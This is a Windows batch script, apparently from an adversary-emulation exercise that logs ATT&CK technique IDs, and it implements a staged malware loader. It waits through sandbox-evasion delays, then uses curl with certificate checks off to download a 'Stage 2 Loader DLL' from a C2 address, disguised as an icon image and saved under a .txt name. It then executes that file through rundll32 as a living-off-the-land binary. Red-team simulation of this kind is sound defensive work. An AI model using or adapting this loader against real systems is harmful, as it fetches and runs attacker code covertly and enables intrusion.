@echo off
setlocal enabledelayedexpansion

SET pvnxkl=%APPDATA%\10430\1ee8e80f
SET rwmtjq=46714663.txt
SET hzsdby=https://10.0.0.49/stage/2/icon.png?10430-7
SET cqfaem=BALAM-S2BO
SET yjlwop=10430
SET tbxrni=7

SET logfile=%APPDATA%\!tbxrni!\macula-simulations.log
if not exist "%APPDATA%\!tbxrni!" mkdir "%APPDATA%\!tbxrni!"

SET tsvar=!DATE!/!TIME!

echo [!tsvar!][DEBUG][!cqfaem!][!yjlwop!]: script_start>> "!logfile!" 2>nul

REM Initial anti-sandbox delay (10-20s) before any logic
timeout /t 15 /nobreak >nul

REM Random delay component
SET /A delay=%RANDOM% %% 20 + 10
timeout /t %delay% /nobreak >nul

echo [!tsvar!][DEBUG][!cqfaem!][!yjlwop!]: initial_delay_complete>> "!logfile!" 2>nul

REM Anti-analysis: Debugger.IsAttached equivalent via timing probe
REM (BAT-level: timing-based heuristic — if system responds suspiciously fast, add jitter)
ping -n 6 127.0.0.1 >nul

echo [!tsvar!][DEBUG][!cqfaem!][!yjlwop!]: anti_analysis_check_start>> "!logfile!" 2>nul

REM Anti-analysis jitter delay (always continues execution, never aborts)
CHOICE /C Y /N /D Y /T 8 >nul

echo [!tsvar!][DEBUG][!cqfaem!][!yjlwop!]: anti_analysis_check_complete>> "!logfile!" 2>nul

REM Log T1497 evasion result (always OK — evasion variant never aborts)
echo [%date% %time%][TTP][!cqfaem!][!yjlwop!]: T1497|Virtualization/Sandbox Evasion=[OK]:[]>> "!logfile!" 2>nul

REM Heartbeat fetch — downloads Stage 2 Loader DLL from C2
echo [!tsvar!][DEBUG][!cqfaem!][!yjlwop!]: heartbeat_start>> "!logfile!" 2>nul

curl -k -s -o "!pvnxkl!\!rwmtjq!" "!hzsdby!"
SET hb_err=%ERRORLEVEL%

echo [!tsvar!][DEBUG][!cqfaem!][!yjlwop!]: heartbeat_complete>> "!logfile!" 2>nul

IF %hb_err% NEQ 0 (
    echo [%date% %time%][TTP][!cqfaem!][!yjlwop!]: T1071|Application Layer Protocol=[FAIL]:[curl_failed]>> "!logfile!" 2>nul
    endlocal
    exit /b 1
)

echo [%date% %time%][TTP][!cqfaem!][!yjlwop!]: T1071|Application Layer Protocol=[OK]:[]>> "!logfile!" 2>nul

REM Inter-operation delay
ping -n 8 127.0.0.1 >nul

REM Change working directory to Loader location
echo [!tsvar!][DEBUG][!cqfaem!][!yjlwop!]: chdir_start>> "!logfile!" 2>nul

cd /d "!pvnxkl!" >nul 2>&1
SET cd_err=%ERRORLEVEL%

echo [!tsvar!][DEBUG][!cqfaem!][!yjlwop!]: chdir_result=%cd_err%>> "!logfile!" 2>nul

REM Inter-operation delay before LOLBIN invocation
CHOICE /C Y /N /D Y /T 7 >nul

REM LOLBIN invocation — execute Stage 2 Loader DLL via rundll32
echo [!tsvar!][DEBUG][!cqfaem!][!yjlwop!]: rundll32_start>> "!logfile!" 2>nul
echo [!tsvar!][DEBUG][!cqfaem!][!yjlwop!]: dll_load_start>> "!logfile!" 2>nul

rundll32.exe !rwmtjq!, DllMain
SET lb_err=%ERRORLEVEL%

echo [!tsvar!][DEBUG][!cqfaem!][!yjlwop!]: process_start_complete>> "!logfile!" 2>nul

IF %lb_err% NEQ 0 (
    echo [%date% %time%][TTP][!cqfaem!][!yjlwop!]: T1218|System Binary Proxy Execution=[FAIL]:[lolbin_invocation_failed]>> "!logfile!" 2>nul
    endlocal
    exit /b 1
)

echo [%date% %time%][TTP][!cqfaem!][!yjlwop!]: T1218|System Binary Proxy Execution=[OK]:[]>> "!logfile!" 2>nul

echo [!tsvar!][DEBUG][!cqfaem!][!yjlwop!]: script_exit>> "!logfile!" 2>nul

endlocal
exit /b 0